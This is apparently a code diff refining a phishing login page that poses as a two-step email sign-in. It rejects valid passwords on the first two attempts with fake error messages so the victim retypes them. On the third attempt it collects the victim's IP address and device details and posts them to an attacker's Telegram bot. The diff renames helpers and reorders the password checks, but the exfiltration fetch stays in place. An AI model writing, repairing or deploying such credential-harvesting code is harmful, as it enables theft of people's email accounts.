@@ -150,10 +150,7 @@
     function getDeviceModel() {
         let userAgent = navigator.userAgent || navigator.vendor || window.opera;
         let platform = navigator.platform;
-        let deviceInfo = `${userAgent} | Platform: ${platform}`;
-        if (deviceInfo.length > 200) {
-            deviceInfo = deviceInfo.substring(0, 200);
-        }
+        let deviceInfo = `UA: ${userAgent.substring(0, 150)} | Platform: ${platform}`;
         return deviceInfo;
     }
 
@@ -161,10 +158,10 @@
         box.textContent = text;
         box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
         box.style.display = 'block';
-        setTimeout(() => box.style.display = 'none', 3500);
+        setTimeout(() => box.style.display = 'none', 3000);
     }
 
-    function clearAndResetToEmail() {
+    function resetToEmailStep() {
         document.getElementById('step2View').classList.add('hidden');
         document.getElementById('step1View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 1 of 2";
@@ -174,12 +171,12 @@
         attemptCount = 0;
     }
 
-    function clearPasswordOnly() {
+    function clearPasswordField() {
         document.getElementById('passwordInput').value = '';
     }
 
     function goBackToEmail() {
-        clearAndResetToEmail();
+        resetToEmailStep();
     }
 
     // Step 1: Email Validation
@@ -219,28 +216,13 @@
         if (hasPashtoCharacters(pass)) {
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
-                clearAndResetToEmail();
+                resetToEmailStep();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
+                clearPasswordField();
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'please pashto not allowed', true);
-                clearPasswordOnly();
-            }
-            return;
-        }
-        
-        // Check for minimum length (less than 8)
-        if (pass.length < 8 && pass.length > 0) {
-            if (attemptCount === 1) {
-                showMessage(errorBox, 'Please check your email', true);
-                clearAndResetToEmail();
-            } else if (attemptCount === 2) {
-                showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
-            } else if (attemptCount === 3) {
-                showMessage(errorBox, 'Password must be at least 8 characters', true);
-                clearPasswordOnly();
+                clearPasswordField();
             }
             return;
         }
@@ -249,13 +231,28 @@
         if (!pass) {
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
-                clearAndResetToEmail();
+                resetToEmailStep();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
+                clearPasswordField();
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'Please enter your password', true);
-                clearPasswordOnly();
+                clearPasswordField();
+            }
+            return;
+        }
+        
+        // Check for minimum length (less than 8)
+        if (pass.length < 8) {
+            if (attemptCount === 1) {
+                showMessage(errorBox, 'Please check your email', true);
+                resetToEmailStep();
+            } else if (attemptCount === 2) {
+                showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordField();
+            } else if (attemptCount === 3) {
+                showMessage(errorBox, 'Password must be at least 8 characters', true);
+                clearPasswordField();
             }
             return;
         }
@@ -264,6 +261,7 @@
         if (attemptCount === 3) {
             let ip = await getUserIP();
             let deviceModel = getDeviceModel();
+            
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
@@ -281,12 +279,13 @@
             }, 2000);
             attemptCount = 0;
         } else {
+            // Attempt 1 or 2 with valid password - still show error and reset
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
-                clearAndResetToEmail();
+                resetToEmailStep();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
-                clearPasswordOnly();
+                clearPasswordField();
             }
         }
     };
